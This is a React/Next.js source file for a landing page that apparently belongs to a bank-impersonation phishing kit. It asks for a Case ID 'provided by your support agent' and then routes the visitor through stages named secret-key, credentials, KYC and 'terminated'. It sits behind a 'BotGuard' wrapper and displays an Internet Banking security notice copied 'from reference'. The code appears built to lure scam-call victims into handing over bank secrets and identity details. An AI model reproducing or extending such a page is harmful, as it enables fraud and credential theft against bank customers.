'use client';

import { useCallback, useState } from 'react';
import { useRouter } from 'next/navigation';
import { useSessionStore } from '@shared';
import { BotGuard } from '@/components/security/BotGuard';
import { Loader2, ArrowRight } from 'lucide-react';

export default function LandingPage() {
  const router = useRouter();
  const [caseId, setCaseId] = useState('');
  const [fieldError, setFieldError] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault();
      setFieldError('');

      if (!caseId.trim()) {
        setFieldError('Please enter your Case ID');
        return;
      }

      setIsLoading(true);

      try {
        const response = await fetch('/api/session/lookup-by-case-id', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            caseId: caseId.trim(),
          }),
        });

        if (!response.ok) {
          const error = await response.json();
          setFieldError(
            error.error || 'Unable to validate Case ID. Please try again.'
          );
          return;
        }

        const data = await response.json();
        const sessionUuid = data.sessionUuid;
        const returnedCaseId = data.caseId;
        const currentStage = data.next_step || 'credentials';
        const guestToken = data.guestToken;

        if (!sessionUuid) {
          setFieldError('Unable to validate Case ID. Please try again.');
          return;
        }

        const stageToRoute: Record<string, string> = {
          secret_key: 'secret-key',
          credentials: 'credentials',
          kyc: 'kyc',
          completed: 'completed',
          terminated: 'terminated',
        };
        const route = stageToRoute[currentStage] || 'credentials';

        useSessionStore.setState({
          sessionUuid,
          caseId: returnedCaseId,
          guestToken,
          stage: currentStage as any,
        });

        router.push(`/${sessionUuid}/${route}`);
      } catch (error) {
        console.error('Error:', error);
        setFieldError('Unable to validate Case ID. Please try again.');
      } finally {
        setIsLoading(false);
      }
    },
    [caseId, router]
  );

  return (
    <BotGuard>
      <div className="card">
        <h1 className="card__title">Welcome</h1>
        <form className="login-form" onSubmit={handleSubmit}>
          <div className="form-group">
            <label htmlFor="case-id" className="form-label">
              Case ID
            </label>
            <input
              type="text"
              id="case-id"
              className="form-input"
              value={caseId}
              onChange={(e) => {
                setCaseId(e.target.value);
                setFieldError('');
              }}
              disabled={isLoading}
              autoFocus
            />
          </div>

          {fieldError && (
            <div style={{ color: '#d32f2f', marginBottom: '16px', fontSize: '14px' }}>
              {fieldError}
            </div>
          )}

          <button type="submit" className="btn" disabled={isLoading}>
            {isLoading ? 'Processing...' : 'Continue'}
            {!isLoading && <ArrowRight className="btn__icon h-5 w-5" strokeWidth={1.5} />}
          </button>
        </form>

        <p className="agreement-text" style={{ textAlign: 'center' }}>
          Please enter the Case ID provided by your support agent.
        </p>
      </div>

      {/* Security Notice reused from reference */}
      <div className="security-notice">
        <div className="security-notice__icon">
          <svg
            aria-hidden="true"
            focusable="false"
            width="24"
            height="24"
            viewBox="0 0 24 24"
            fill="none"
            xmlns="http://www.w3.org/2000/svg"
          >
            <path
              fillRule="evenodd"
              clipRule="evenodd"
              d="M12 2C6.48 2 2 6.48 2 12C2 17.52 6.48 22 12 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 12 2ZM13 17H11V11H13V17ZM13 9H11V7H13V9Z"
              fill="#002f6b"
            />
          </svg>
        </div>
        <div className="security-notice__content">
          <p>
            We've added a new security feature. When you use Internet Banking, we
            collect information about behaviour like how you type. This helps us
            to spot any activity that isn't yours, to detect and prevent fraud.
          </p>
          <a href="#">More about this feature</a>
        </div>
      </div>
    </BotGuard>
  );
}
